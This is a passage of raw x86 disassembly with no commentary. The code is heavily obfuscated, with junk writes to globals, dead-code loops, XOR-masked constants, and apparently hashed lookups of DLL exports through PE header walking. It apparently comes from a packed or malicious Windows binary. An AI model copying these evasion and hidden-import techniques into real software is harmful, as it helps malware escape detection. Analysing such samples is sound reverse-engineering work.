  423953:	mov    edx,DWORD PTR [ebp-0x8]
  423956:	xor    eax,ecx
  423958:	not    DWORD PTR ds:0x42a2ea
  42395e:	add    eax,esi
  423960:	imul   eax,DWORD PTR [edx]
  423963:	dec    edx
  423964:	mov    edx,DWORD PTR [ebp+0x8]
  423967:	xor    edx,ecx
  423969:	add    edx,esi
  42396b:	cmp    edx,eax
  42396d:	mov    eax,DWORD PTR [ebp-0x4]
  423970:	mov    DWORD PTR ds:0x42a26a,0x1fb7
  42397a:	je     0x4239ae
  423980:	mov    edx,DWORD PTR [ebp-0x18]
  423983:	add    DWORD PTR [eax],edx
  423985:	mov    eax,DWORD PTR [ebp-0x4]
  423988:	mov    edx,DWORD PTR [ebp+0xc]
  42398b:	xor    edx,ecx
  42398d:	add    edx,esi
  42398f:	imul   edx,DWORD PTR [eax]
  423992:	mov    DWORD PTR [eax],edx
  423994:	mov    eax,DWORD PTR [ebp-0x4]
  423997:	mov    DWORD PTR [ebp-0x1c],eax
  42399a:	mov    eax,DWORD PTR [ebp+0x10]
  42399d:	xor    eax,ecx
  42399f:	mov    edx,0xffcd8d0f
  4239a4:	sub    edx,eax
  4239a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4239a9:	jmp    0x4239c8
  4239ae:	mov    edx,DWORD PTR [ebp+0x14]
  4239b1:	xor    DWORD PTR [eax],edx
  4239b3:	mov    eax,DWORD PTR [ebp-0x4]
  4239b6:	mov    DWORD PTR [ebp-0x1c],eax
  4239b9:	mov    eax,DWORD PTR [ebp+0x10]
  4239bc:	xor    eax,ecx
  4239be:	mov    edx,0xffcd8d0f
  4239c3:	sub    edx,eax
  4239c5:	mov    eax,DWORD PTR [ebp-0x1c]
  4239c8:	add    DWORD PTR [eax],edx
  4239ca:	mov    eax,DWORD PTR [ebp-0x4]
  4239cd:	mov    edx,DWORD PTR [ebp-0x8]
  4239d0:	add    edx,DWORD PTR [eax]
  4239d2:	mov    DWORD PTR [ebp-0x8],edx
  4239d5:	mov    eax,DWORD PTR [ebp+0xc]
  4239d8:	mov    edx,DWORD PTR [ebp+0xc]
  4239db:	xor    edx,ecx
  4239dd:	xor    eax,ecx
  4239df:	lea    eax,[eax+edx*1+0x64e5e2]
  4239e6:	mov    edx,DWORD PTR [ebp+0xc]
  4239e9:	xor    edx,ecx
  4239eb:	add    edx,esi
  4239ed:	imul   eax,edx
  4239f0:	mov    edx,DWORD PTR [ebp+0xc]
  4239f3:	xor    edx,ecx
  4239f5:	sub    edx,eax
  4239f7:	mov    eax,DWORD PTR [ebp-0x4]
  4239fa:	add    edx,esi
  4239fc:	cmp    DWORD PTR [eax],edx
  4239fe:	mov    eax,DWORD PTR [ebp-0x4]
  423a01:	jg     0x423a1e
  423a07:	mov    DWORD PTR [ebp-0x1c],eax
  423a0a:	mov    eax,DWORD PTR [ebp+0x10]
  423a0d:	xor    eax,ecx
  423a0f:	mov    edx,0xffcd8d0f
  423a14:	sub    edx,eax
  423a16:	mov    eax,DWORD PTR [ebp-0x1c]
  423a19:	jmp    0x423a25
  423a1e:	mov    edx,DWORD PTR [ebp+0x10]
  423a21:	xor    edx,ecx
  423a23:	add    edx,esi
  423a25:	add    DWORD PTR [eax],edx
  423a27:	mov    eax,DWORD PTR [ebp-0x8]
  423a2a:	mov    edx,DWORD PTR [ebp-0x10]
  423a2d:	mov    eax,DWORD PTR [eax]
  423a2f:	xor    edx,ecx
  423a31:	add    edx,0x3272f0
  423a37:	not    edx
  423a39:	and    eax,edx
  423a3b:	mov    DWORD PTR [ebp-0x4],eax
  423a3e:	movsx  eax,BYTE PTR [eax+0x1]
  423a42:	cdq    
  423a43:	add    eax,ebx
  423a45:	adc    edx,0xffffffff
  423a48:	xor    eax,edi
  423a4a:	xor    edx,0x0
  423a4d:	cmp    eax,0x70941e0f
  423a52:	jne    0x423a86
  423a58:	cmp    edx,0xffffffff
  423a5b:	jne    0x423a86
  423a61:	mov    eax,DWORD PTR [ebp-0x4]
  423a64:	movsx  eax,BYTE PTR [eax]
  423a67:	cdq    
  423a68:	add    eax,ebx
  423a6a:	adc    edx,0xffffffff
  423a6d:	xor    eax,edi
  423a6f:	xor    edx,0x0
  423a72:	cmp    eax,0x70941e18
  423a77:	jne    0x423a86
  423a7d:	cmp    edx,0xffffffff
  423a80:	je     0x423a9d
  423a86:	mov    eax,DWORD PTR [ebp-0x10]
  423a89:	xor    eax,ecx
  423a8b:	mov    edx,0xffcd8d0f
  423a90:	sub    edx,eax
  423a92:	add    DWORD PTR [ebp-0x4],edx
  423a95:	mov    eax,DWORD PTR [ebp-0x4]
  423a98:	jmp    0x423a3e
  423a9d:	mov    eax,DWORD PTR [ebp-0x14]
  423aa0:	mov    eax,DWORD PTR [eax]
  423aa2:	mov    edx,DWORD PTR [ebp-0x4]
  423aa5:	mov    edx,DWORD PTR [edx+0x3c]
  423aa8:	lea    eax,[edx+eax*8+0x78]
  423aac:	mov    edx,DWORD PTR [ebp-0x4]
  423aaf:	mov    eax,DWORD PTR [eax+edx*1]
  423ab2:	mov    DWORD PTR [ebp-0x8],eax
  423ab5:	mov    eax,DWORD PTR [ebp+0x8]
  423ab8:	xor    eax,ecx
  423aba:	add    eax,esi
  423abc:	mov    DWORD PTR [ebp-0x14],eax
  423abf:	mov    eax,DWORD PTR [ebp+0x8]
  423ac2:	mov    edx,DWORD PTR [ebp-0x8]
  423ac5:	xor    eax,ecx
  423ac7:	add    eax,esi
  423ac9:	cmp    edx,eax
  423acb:	jne    0x423ae9
  423ad1:	mov    eax,DWORD PTR [ebp+0xc]
  423ad4:	xor    eax,ecx
  423ad6:	mov    ecx,DWORD PTR [ebp-0x8]
  423ad9:	add    eax,esi
  423adb:	imul   eax,ecx
  423ade:	mov    DWORD PTR [ebp-0x8],eax
  423ae1:	push   DWORD PTR [ebp+0x18]
  423ae4:	jmp    0x423b44
  423ae9:	mov    eax,DWORD PTR [ebp-0x8]
  423aec:	mov    ecx,DWORD PTR [ebp-0x4]
  423aef:	add    eax,ecx
  423af1:	mov    DWORD PTR [ebp-0x14],eax
  423af4:	mov    eax,DWORD PTR [ebp-0x14]
  423af7:	mov    eax,DWORD PTR [eax+0xc]
  423afa:	movsx  eax,BYTE PTR [eax+ecx*1]
  423afe:	cdq    
  423aff:	add    eax,ebx
  423b01:	adc    edx,0xffffffff
  423b04:	xor    eax,edi
  423b06:	xor    edx,0x0
  423b09:	cmp    eax,0x70941e1e
  423b0e:	jne    0x423ae1
  423b14:	cmp    edx,0xffffffff
  423b17:	jne    0x423ae1
  423b1d:	mov    eax,ds:0x42941e
  423b22:	mov    eax,DWORD PTR [eax+0x198]
  423b28:	mov    DWORD PTR [eax],ecx
  423b2a:	mov    eax,ecx
  423b2c:	jmp    0x423b55
  423b31:	mov    eax,DWORD PTR [ebp+0x18]
  423b34:	cmp    eax,0xf89c85ba
  423b39:	jne    0x423b55
  423b3f:	push   0xf89c85bb
  423b44:	push   DWORD PTR [ebp+0x14]
  423b47:	push   DWORD PTR [ebp+0x10]
  423b4a:	push   DWORD PTR [ebp+0xc]
  423b4d:	push   DWORD PTR [ebp+0x8]
  423b50:	call   0x4234dd
  423b55:	pop    edi
  423b56:	pop    ebx
  423b57:	pop    esi
  423b58:	leave  
  423b59:	ret    0x14
  423b5c:	push   ebp
  423b5d:	mov    ebp,esp
  423b5f:	and    esp,0xfffffff8
  423b62:	mov    DWORD PTR ds:0x42a276,0x3141
  423b6c:	sub    esp,0x3fc
  423b72:	mov    DWORD PTR ds:0x42a2fa,0x2654
  423b7c:	push   ebx
  423b7d:	push   esi
  423b7e:	adc    DWORD PTR ds:0x42a2f2,0x42a2e6
  423b88:	push   edi
  423b89:	xor    edi,edi
  423b8b:	or     DWORD PTR ds:0x42a256,0x42a2de
  423b95:	push   edi
  423b96:	call   DWORD PTR ds:0x42a3b6
  423b9c:	add    DWORD PTR ds:0x42a2e2,0x667e
  423ba6:	mov    DWORD PTR [esp+0x10],eax
  423baa:	sbb    DWORD PTR ds:0x42a2f2,0x42a27e
  423bb4:	lea    eax,[esp+0x78]
  423bb8:	push   eax
  423bb9:	sbb    DWORD PTR ds:0x42a302,0x70a3
  423bc3:	push   0x429542
  423bc8:	or     DWORD PTR ds:0x42a2be,0x4f4
  423bd2:	call   DWORD PTR ds:0x42a3c6
  423bd8:	mov    DWORD PTR ds:0x42a2c6,0x224d
  423be2:	cmp    eax,0xffffffff
  423be5:	mov    DWORD PTR ds:0x42a26a,0x664
  423bef:	je     0x423c06
  423bf5:	xor    eax,eax
  423bf7:	mov    DWORD PTR ds:0x42a2ee,0x6e63
  423c01:	jmp    0x424e58
  423c06:	mov    DWORD PTR ds:0x42a2ee,0x3a46
  423c10:	mov    esi,DWORD PTR ds:0x42a3fe
  423c16:	push   0xf
  423c18:	lea    eax,[esp+0x44]
  423c1c:	xor    DWORD PTR ds:0x42a26a,0x150a
  423c26:	push   eax
  423c27:	push   0x429556
  423c2c:	push   0x42956a
  423c31:	xor    DWORD PTR ds:0x42a2de,0x3930
  423c3b:	push   0x42958a
  423c40:	call   esi
  423c42:	imul   eax,eax,0x300000
  423c48:	cmp    eax,0x1b00000
  423c4d:	jne    0x423bf5
  423c53:	sub    DWORD PTR ds:0x42a26a,0x42a2e2
  423c5d:	lea    eax,[esp+0x1b8]
  423c64:	adc    DWORD PTR ds:0x42a28e,0x3c8a
  423c6e:	push   eax
  423c6f:	push   0x4295c6
  423c74:	call   DWORD PTR ds:0x42a3e6
  423c7a:	mov    DWORD PTR ds:0x42a2ca,0x78b4
  423c84:	cmp    eax,0xffffffff
  423c87:	mov    DWORD PTR ds:0x42a296,0x5d2d
  423c91:	jne    0x423bf5
  423c97:	and    DWORD PTR ds:0x42a25e,0x42a266
  423ca1:	push   DWORD PTR [esp+0x10]
  423ca5:	push   edi
  423ca6:	call   DWORD PTR ds:0x42a3ba
  423cac:	add    DWORD PTR ds:0x42a256,0x6e9d
  423cb6:	mov    DWORD PTR [esp+0x30],edi
  423cba:	or     ecx,ecx
  423cbc:	mov    DWORD PTR [esp+0x20],0xf89c85a5
  423cc4:	mov    DWORD PTR ds:0x42a2ba,0x17
  423cce:	cmp    DWORD PTR ds:0x42a2ba,0x0
  423cd5:	je     0x423d38
  423cdb:	cmp    DWORD PTR ds:0x42a2ba,0x4
  423ce2:	jl     0x423d38
  423ce8:	jmp    0x423d0a
  423ced:	push   0x1
  423cef:	push   0x4b19
  423cf4:	push   DWORD PTR [ebp-0x1c]
  423cf7:	push   0x1751
  423cfc:	push   0x1baf
  423d01:	push   DWORD PTR [ebp-0x24]
  423d04:	call   DWORD PTR ds:0x42a3c2
  423d0a:	cmp    DWORD PTR ds:0x42a2ba,0x5
  423d11:	jne    0x423d24
  423d17:	mov    ecx,DWORD PTR ds:0x42a2ba
  423d1d:	dec    ecx
  423d1e:	mov    DWORD PTR ds:0x42a2ba,ecx
  423d24:	xor    ecx,ecx
  423d26:	xor    ecx,DWORD PTR ds:0x42a2ba
  423d2c:	dec    ecx
  423d2d:	mov    DWORD PTR ds:0x42a2ba,ecx
  423d33:	jmp    0x423cce
  423d38:	mov    DWORD PTR [esp+0xc],0xf89c85ba
  423d40:	adc    DWORD PTR ds:0x42a292,edx
  423d46:	lea    eax,[esp+0x3c]
  423d4a:	mov    edi,DWORD PTR ds:0x42a2ba
  423d50:	or     DWORD PTR ds:0x42a26e,edi
  423d56:	mov    DWORD PTR [esp+0x30],eax
  423d5a:	lea    eax,[esp+0x38]
  423d5e:	and    edi,ecx
  423d60:	mov    DWORD PTR [esp+0x10],eax
  423d64:	add    edi,ecx
  423d66:	mov    eax,ds:0x42941e
  423d6b:	and    DWORD PTR ds:0x42a25a,0x0
  423d75:	jmp    0x423d87
  423d7a:	mov    edi,DWORD PTR ds:0x42a25a
  423d80:	inc    edi
  423d81:	mov    DWORD PTR ds:0x42a25a,edi
  423d87:	cmp    DWORD PTR ds:0x42a25a,0x16
  423d8e:	jae    0x423dbb
  423d94:	cmp    DWORD PTR ds:0x42a25a,0x17
  423d9b:	jbe    0x423dbb
  423da1:	jmp    0x423db6
  423da6:	push   0x42a256
  423dab:	push   0x42919f
  423db0:	call   DWORD PTR ds:0x42a3ca
  423db6:	jmp    0x423d7a
  423dbb:	mov    eax,DWORD PTR [eax+0x1c8]
  423dc1:	sbb    ebx,edi
  423dc3:	mov    eax,DWORD PTR [eax]
  423dc5:	add    DWORD PTR ds:0x42a26a,0x5b95
  423dcf:	mov    ecx,DWORD PTR [esp+0x10]
  423dd3:	mov    edi,0x75108aa
  423dd8:	mov    ebx,DWORD PTR ds:0x42a2e6
  423dde:	sbb    DWORD PTR ds:0x42a25e,ebx
  423de4:	xor    eax,edi
  423de6:	adc    DWORD PTR ds:0x42a2fe,0x37f0
  423df0:	mov    ebx,0x3272f1
  423df5:	add    DWORD PTR ds:0x42a2ae,0x42a2b2
  423dff:	add    eax,ebx
  423e01:	not    DWORD PTR ds:0x42a2ae
  423e07:	mov    DWORD PTR [ecx],eax
  423e09:	mov    DWORD PTR ds:0x42a2d6,0x5252
  423e13:	mov    eax,ds:0x42a11a
  423e18:	cmp    eax,0x445cecf9
  423e1d:	mov    DWORD PTR ds:0x42a2c6,0x4b3f
  423e27:	jne    0x423f15
  423e2d:	mov    eax,DWORD PTR [esp+0x20]
  423e31:	and    DWORD PTR ds:0x42a2b6,0x0
  423e3b:	jmp    0x423e4d
  423e40:	mov    ecx,DWORD PTR ds:0x42a2b6
  423e46:	inc    ecx
  423e47:	mov    DWORD PTR ds:0x42a2b6,ecx
  423e4d:	cmp    DWORD PTR ds:0x42a2b6,0x14
  423e54:	jae    0x423e9d
  423e5a:	cmp    DWORD PTR ds:0x42a2b6,0x8
  423e61:	ja     0x423e9d
  423e67:	jmp    0x423e7c
  423e6c:	push   0x84fb
  423e71:	push   0x42a28e
  423e76:	call   DWORD PTR ds:0x42a3ce
  423e7c:	cmp    DWORD PTR ds:0x42a2b6,0x7
  423e83:	jne    0x423e98
  423e89:	xor    ecx,ecx
  423e8b:	add    ecx,DWORD PTR ds:0x42a2b6
  423e91:	inc    ecx
  423e92:	mov    DWORD PTR ds:0x42a2b6,ecx
  423e98:	jmp    0x423e40
  423e9d:	mov    ecx,DWORD PTR ds:0x42941e
  423ea3:	adc    DWORD PTR ds:0x42a2be,0x42a2b2
  423ead:	mov    ecx,DWORD PTR [ecx+0x198]
  423eb3:	adc    DWORD PTR ds:0x42a2ae,0x42a29a
  423ebd:	xor    eax,edi
  423ebf:	sub    DWORD PTR ds:0x42a27a,0x42a2a2
  423ec9:	add    eax,ebx
  423ecb:	add    DWORD PTR ds:0x42a26a,0x42a266
  423ed5:	mov    DWORD PTR [ecx],eax
  423ed7:	mov    eax,DWORD PTR [esp+0x20]
  423edb:	xor    eax,edi
  423edd:	not    DWORD PTR ds:0x42a2be
  423ee3:	add    eax,ebx
  423ee5:	sbb    DWORD PTR ds:0x42a2f6,0x42a2de
  423eef:	mov    ds:0x42a11a,eax
  423ef4:	mov    eax,DWORD PTR [esp+0x20]
  423ef8:	sbb    DWORD PTR ds:0x42a286,0x42a26a
  423f02:	xor    eax,edi
  423f04:	sub    DWORD PTR ds:0x42a272,0x5dcc
  423f0e:	add    eax,ebx
  423f10:	mov    ds:0x429516,eax
  423f15:	and    DWORD PTR ds:0x42a2ce,0x0
  423f1f:	xor    eax,eax
  423f21:	xor    eax,DWORD PTR ds:0x42a2ce
  423f27:	inc    eax
  423f28:	mov    ds:0x42a2ce,eax
  423f2d:	cmp    DWORD PTR ds:0x42a2ce,0x10
  423f34:	jg     0x423f7a
  423f3a:	jmp    0x423f55
  423f3f:	push   DWORD PTR [ebp-0x18]
  423f42:	push   0x42a2b6
  423f47:	push   DWORD PTR [ebp-0x10]
  423f4a:	push   0x4828
  423f4f:	call   DWORD PTR ds:0x42a3d2
  423f55:	cmp    DWORD PTR ds:0x42a2ce,0xf
  423f5c:	jne    0x423f6d
  423f62:	mov    eax,ds:0x42a2ce
  423f67:	inc    eax
  423f68:	mov    ds:0x42a2ce,eax
  423f6d:	cmp    DWORD PTR ds:0x42a2ce,0x1a
  423f74:	jb     0x423f1f
  423f7a:	mov    eax,ds:0x42941e
  423f7f:	mov    eax,DWORD PTR [eax+0x18c]
  423f85:	add    DWORD PTR ds:0x42a28e,0x42a292
  423f8f:	mov    eax,DWORD PTR [eax]
  423f91:	neg    DWORD PTR ds:0x42a302
  423f97:	mov    DWORD PTR [esp+0x60],eax
  423f9b:	xor    eax,eax
  423f9d:	xor    eax,DWORD PTR ds:0x42a27a
  423fa3:	xor    eax,DWORD PTR ds:0x42a266
  423fa9:	mov    ds:0x42a27a,eax
  423fae:	mov    eax,0xf89c85b9
  423fb3:	mov    DWORD PTR [esp+0x18],eax
  423fb7:	mov    DWORD PTR [esp+0x18],eax
  423fbb:	and    DWORD PTR ds:0x42a2ae,0xe84
  423fc5:	mov    DWORD PTR [esp+0x18],eax
  423fc9:	sub    DWORD PTR ds:0x42a2ce,0x42a2d6
  423fd3:	mov    DWORD PTR [esp+0x18],0xf89c85a5
  423fdb:	adc    DWORD PTR ds:0x42a2f2,0x42a29a
  423fe5:	mov    DWORD PTR [esp+0x10],eax
  423fe9:	xor    eax,0x48fc
  423fee:	mov    DWORD PTR [esp+0x10],0xf89c85bd
  423ff6:	mov    eax,DWORD PTR [esp+0x20]
  423ffa:	add    DWORD PTR ds:0x42a2fa,0x42a25e
  424004:	xor    eax,edi
  424006:	sub    DWORD PTR ds:0x42a29a,0x2bd1
  424010:	add    eax,ebx
  424012:	mov    DWORD PTR ds:0x42a276,0x6294
  42401c:	jmp    0x424260
  424021:	lea    eax,[esp+0x78]
  424025:	push   eax
  424026:	dec    DWORD PTR ds:0x42a292
  42402c:	push   0x4295b2
  424031:	adc    DWORD PTR ds:0x42a2fa,0x42a2de
  42403b:	call   DWORD PTR ds:0x42a3c6
  424041:	mov    DWORD PTR ds:0x42a262,0x2f3f
  42404b:	cmp    eax,0xffffffff
  42404e:	jne    0x423bf5
  424054:	add    DWORD PTR ds:0x42a2da,0x42a2d2
  42405e:	push   0xf
  424060:	and    DWORD PTR ds:0x42a2ce,0x42a27e
  42406a:	lea    eax,[esp+0x44]
  42406e:	push   eax
  42406f:	push   0x429606
  424074:	push   0x42961a
  424079:	push   0x42963a
  42407e:	call   esi
  424080:	or     DWORD PTR ds:0x42a2fa,0x3e60
  42408a:	imul   eax,eax,0x300000
  424090:	mov    DWORD PTR ds:0x42a2ae,0x6f02
  42409a:	cmp    eax,0x1b00000
  42409f:	mov    DWORD PTR ds:0x42a256,0x6c6e
  4240a9:	jne    0x423bf5
  4240af:	or     DWORD PTR ds:0x42a2ea,0x2c5c
  4240b9:	lea    eax,[esp+0x1b8]
  4240c0:	push   eax
  4240c1:	push   0x429676
  4240c6:	add    DWORD PTR ds:0x42a2de,0x42a26e
  4240d0:	call   DWORD PTR ds:0x42a3e6
  4240d6:	mov    DWORD PTR ds:0x42a27e,0xb7
  4240e0:	cmp    eax,0xffffffff
  4240e3:	mov    DWORD PTR ds:0x42a29a,0x2154
  4240ed:	jne    0x423bf5
  4240f3:	xor    DWORD PTR ds:0x42a2ae,0x154c
  4240fd:	mov    eax,DWORD PTR [esp+0xc]
  424101:	mov    DWORD PTR ds:0x42a26e,0x11
  42410b:	cmp    DWORD PTR ds:0x42a26e,0x0
  424112:	je     0x42415d
  424118:	cmp    DWORD PTR ds:0x42a26e,0x12
  42411f:	jge    0x42415d
  424125:	jmp    0x42414b
  42412a:	push   DWORD PTR [ebp-0x28]
  42412d:	push   DWORD PTR [ebp-0x24]
  424130:	push   DWORD PTR [ebp-0x24]
  424133:	push   0x7e73
  424138:	push   DWORD PTR [ebp-0x18]
  42413b:	push   0x85b3
  424140:	push   0x429247
  424145:	call   DWORD PTR ds:0x42a3d6
  42414b:	mov    ecx,DWORD PTR ds:0x42a26e
  424151:	dec    ecx
  424152:	mov    DWORD PTR ds:0x42a26e,ecx
  424158:	jmp    0x42410b
  42415d:	mov    ecx,DWORD PTR [esp+0x10]
  424161:	adc    DWORD PTR ds:0x42a2ae,0x42a2d2
  42416b:	xor    eax,edi
  42416d:	lea    eax,[eax+ecx*1+0x3272f1]
  424174:	push   eax
  424175:	and    DWORD PTR ds:0x42a2ea,0x0
  42417f:	mov    eax,ds:0x42a2ea
  424184:	inc    eax
  424185:	mov    ds:0x42a2ea,eax
  42418a:	cmp    DWORD PTR ds:0x42a2ea,0x26
  424191:	jbe    0x4241af
  424197:	jmp    0x4241a2
  42419c:	call   DWORD PTR ds:0x42a3da
  4241a2:	cmp    DWORD PTR ds:0x42a2ea,0x1a
  4241a9:	jb     0x42417f
  4241af:	mov    eax,DWORD PTR [esp+0x1c]
  4241b3:	sbb    DWORD PTR ds:0x42a2aa,0x42a2be
  4241bd:	xor    eax,edi
  4241bf:	lea    eax,[ebp+eax*1+0x3272f9]
  4241c6:	push   eax
  4241c7:	mov    eax,ds:0x42941e
  4241cc:	push   DWORD PTR [eax+0x1bc]
  4241d2:	sub    DWORD PTR ds:0x42a2ea,0x42a286
  4241dc:	call   0x424e61
  4241e1:	mov    eax,DWORD PTR [esp+0xc]
  4241e5:	mov    ecx,DWORD PTR [esp+0x10]
  4241e9:	and    DWORD PTR ds:0x42a2aa,0x0
  4241f3:	mov    edx,DWORD PTR ds:0x42a2aa
  4241f9:	inc    edx
  4241fa:	mov    DWORD PTR ds:0x42a2aa,edx
  424200:	cmp    DWORD PTR ds:0x42a2aa,0x9
  424207:	jg     0x424251
  42420d:	jmp    0x424228
  424212:	push   DWORD PTR [ebp-0x10]
  424215:	push   0x1529
  42421a:	push   DWORD PTR [ebp-0x28]
  42421d:	push   0x155a
  424222:	call   DWORD PTR ds:0x42a3de
  424228:	cmp    DWORD PTR ds:0x42a2aa,0x8
  42422f:	jne    0x424244
  424235:	xor    edx,edx
  424237:	or     edx,DWORD PTR ds:0x42a2aa
  42423d:	inc    edx
  42423e:	mov    DWORD PTR ds:0x42a2aa,edx
  424244:	cmp    DWORD PTR ds:0x42a2aa,0x1e
  42424b:	jb     0x4241f3
  424251:	xor    eax,edi
  424253:	adc    DWORD PTR ds:0x42a256,ebx
  424259:	lea    eax,[ecx+eax*1+0x3272f1]
  424260:	movzx  ecx,WORD PTR ds:0x42a2a6
  424267:	xor    DWORD PTR ds:0x42a29e,ecx
  42426d:	mov    ecx,DWORD PTR [esp+0xc]
  424271:	mov    edx,DWORD PTR [esp+0xc]
  424275:	adc    DWORD PTR ds:0x42a2b6,0x42a2ee
  42427f:	xor    edx,edi
  424281:	xor    ecx,edi
  424283:	add    ecx,edx
  424285:	mov    edx,DWORD PTR [esp+0xc]
  424289:	xor    edx,edi
  42428b:	lea    ecx,[ecx+edx*1+0x9758d3]
  424292:	mov    DWORD PTR ds:0x42a2ea,0x175a
  42429c:	mov    DWORD PTR [esp+0x10],eax
  4242a0:	mov    DWORD PTR ds:0x42a28e,0x2b18
  4242aa:	cmp    eax,ecx
  4242ac:	jbe    0x424021
  4242b2:	or     ecx,DWORD PTR ds:0x42a286
  4242b8:	mov    eax,DWORD PTR [ebp+0xc]
  4242bb:	mov    ds:0x4292a2,eax
  4242c0:	mov    eax,DWORD PTR [ebp+0x10]
  4242c3:	and    DWORD PTR ds:0x42a2c2,0x0
  4242cd:	jmp    0x4242e1
  4242d2:	xor    ecx,ecx
  4242d4:	xor    ecx,DWORD PTR ds:0x42a2c2
  4242da:	inc    ecx
  4242db:	mov    DWORD PTR ds:0x42a2c2,ecx
  4242e1:	cmp    DWORD PTR ds:0x42a2c2,0x1b
  4242e8:	jae    0x42430b
  4242ee:	cmp    DWORD PTR ds:0x42a2c2,0x29
  4242f5:	jle    0x42430b
  4242fb:	jmp    0x424306
  424300:	call   DWORD PTR ds:0x42a3e2
  424306:	jmp    0x4242d2
  42430b:	mov    ds:0x4294fe,eax
  424310:	xor    ecx,eax
  424312:	mov    eax,ds:0x4292a2
  424317:	and    ecx,0x3395
  42431d:	mov    ecx,DWORD PTR [esp+0x30]
  424321:	add    DWORD PTR ds:0x42a2c2,0x886
  42432b:	sub    eax,ebx
  42432d:	adc    DWORD PTR ds:0x42a2c2,0x4089
  424337:	xor    eax,edi
  424339:	sub    DWORD PTR ds:0x42a2b6,0x2768
  424343:	mov    DWORD PTR [ecx],eax
  424345:	and    DWORD PTR ds:0x42a2aa,0x51d9
  42434f:	lea    eax,[esp+0x2c]
  424353:	mov    DWORD PTR [esp+0x6c],eax
  424357:	lea    eax,[ebp+0x4]
  42435a:	mov    DWORD PTR [esp+0x2c],eax
  42435e:	xor    DWORD PTR ds:0x42a2da,0x6aa
  424368:	lea    eax,[esp+0x78]
  42436c:	sub    DWORD PTR ds:0x42a266,0x42a2ba
  424376:	push   eax
  424377:	push   0x429662
  42437c:	sub    DWORD PTR ds:0x42a25e,0x6538
  424386:	call   DWORD PTR ds:0x42a3c6
  42438c:	mov    DWORD PTR ds:0x42a2aa,0x7d87
  424396:	cmp    eax,0xffffffff
  424399:	jne    0x423bf5
  42439f:	push   0xf
  4243a1:	lea    eax,[esp+0x44]
  4243a5:	push   eax
  4243a6:	and    DWORD PTR ds:0x42a302,0x42a2e2
  4243b0:	push   0x4296b6
  4243b5:	sub    DWORD PTR ds:0x42a2d2,0x1a40
  4243bf:	push   0x4296ca
  4243c4:	adc    DWORD PTR ds:0x42a302,0xcfc
  4243ce:	push   0x4296ea
  4243d3:	add    DWORD PTR ds:0x42a292,0x42a286
  4243dd:	call   esi
  4243df:	xor    DWORD PTR ds:0x42a2aa,0x42a302
  4243e9:	imul   eax,eax,0x300000
  4243ef:	cmp    eax,0x1b00000
  4243f4:	mov    DWORD PTR ds:0x42a2d6,0x3d32
  4243fe:	jne    0x423bf5
  424404:	lea    eax,[esp+0x1b8]
  42440b:	adc    DWORD PTR ds:0x42a29a,0x42a2c6
  424415:	push   eax
  424416:	and    DWORD PTR ds:0x42a2ea,0x7bce
  424420:	push   0x429726
  424425:	xor    DWORD PTR ds:0x42a2d2,0x75c
  42442f:	call   DWORD PTR ds:0x42a3e6
  424435:	cmp    eax,0xffffffff
  424438:	mov    DWORD PTR ds:0x42a2d6,0x39fb
  424442:	jne    0x423bf5
  424448:	sbb    DWORD PTR ds:0x42a2ea,0x7658
  424452:	lea    eax,[esp+0x78]
  424456:	push   eax
  424457:	push   0x429712
  42445c:	call   DWORD PTR ds:0x42a3c6
  424462:	cmp    eax,0xffffffff
  424465:	mov    DWORD PTR ds:0x42a27a,0x74cc
  42446f:	jne    0x423bf5
  424475:	adc    DWORD PTR ds:0x42a2be,0x42a2e2
  42447f:	push   0xf
  424481:	and    DWORD PTR ds:0x42a272,0x42a2d6
  42448b:	lea    eax,[esp+0x44]
  42448f:	xor    DWORD PTR ds:0x42a2da,0x20f3
  424499:	push   eax
  42449a:	sub    DWORD PTR ds:0x42a2f2,0x57ed
  4244a4:	push   0x429766
  4244a9:	push   0x42977a
  4244ae:	push   0x42979a
  4244b3:	sbb    DWORD PTR ds:0x42a272,0x42a302
  4244bd:	call   esi
  4244bf:	imul   eax,eax,0x300000
  4244c5:	cmp    eax,0x1b00000
  4244ca:	mov    DWORD PTR ds:0x42a2ea,0x7ab0
  4244d4:	jne    0x423bf5
  4244da:	and    DWORD PTR ds:0x42a2e6,0x42a29a
  4244e4:	lea    eax,[esp+0x1b8]
  4244eb:	neg    DWORD PTR ds:0x42a26e
  4244f1:	push   eax
  4244f2:	push   0x4297d6
  4244f7:	xor    DWORD PTR ds:0x42a28e,0x42a2c2
  424501:	call   DWORD PTR ds:0x42a3e6
  424507:	mov    DWORD PTR ds:0x42a292,0x73e5
  424511:	cmp    eax,0xffffffff
  424514:	jne    0x423bf5
  42451a:	lea    eax,[esp+0x78]
  42451e:	xor    DWORD PTR ds:0x42a2ea,0x42a256
  424528:	push   eax
  424529:	and    DWORD PTR ds:0x42a28e,0x42a256
  424533:	push   0x4297c2
  424538:	sub    DWORD PTR ds:0x42a26e,0xb4e
  424542:	call   DWORD PTR ds:0x42a3c6
  424548:	mov    DWORD PTR ds:0x42a292,0x325f
  424552:	cmp    eax,0xffffffff
  424555:	mov    DWORD PTR ds:0x42a2d2,0x412a
  42455f:	jne    0x423bf5
  424565:	adc    DWORD PTR ds:0x42a28a,0x42a27a
  42456f:	push   0xf
  424571:	lea    eax,[esp+0x44]
  424575:	push   eax
  424576:	adc    DWORD PTR ds:0x42a28a,0x1e7a
  424580:	push   0x429816
  424585:	sub    DWORD PTR ds:0x42a2aa,0xfe
  42458f:	push   0x42982a
  424594:	sub    DWORD PTR ds:0x42a27e,0x1b5
  42459e:	push   0x42984a
  4245a3:	adc    DWORD PTR ds:0x42a28e,0x2d72
  4245ad:	call   esi
  4245af:	imul   eax,eax,0x300000
  4245b5:	cmp    eax,0x1b00000
  4245ba:	mov    DWORD PTR ds:0x42a28e,0x482a
  4245c4:	jne    0x423bf5
  4245ca:	sub    DWORD PTR ds:0x42a25a,0x42a2ba
  4245d4:	lea    eax,[esp+0x1b8]
  4245db:	push   eax
  4245dc:	adc    DWORD PTR ds:0x42a28e,0x42a2da
  4245e6:	push   0x429886
  4245eb:	xor    DWORD PTR ds:0x42a26e,0x42a29a
  4245f5:	call   DWORD PTR ds:0x42a3e6
  4245fb:	mov    DWORD PTR ds:0x42a2ca,0x1025
  424605:	cmp    eax,0xffffffff
  424608:	jne    0x423bf5
  42460e:	xor    DWORD PTR ds:0x42a2c2,0x449b
  424618:	lea    eax,[esp+0x78]
  42461c:	push   eax
  42461d:	push   0x429872
  424622:	and    DWORD PTR ds:0x42a27a,0x42a2fa
  42462c:	call   DWORD PTR ds:0x42a3c6
  424632:	mov    DWORD PTR ds:0x42a2fa,0x2004
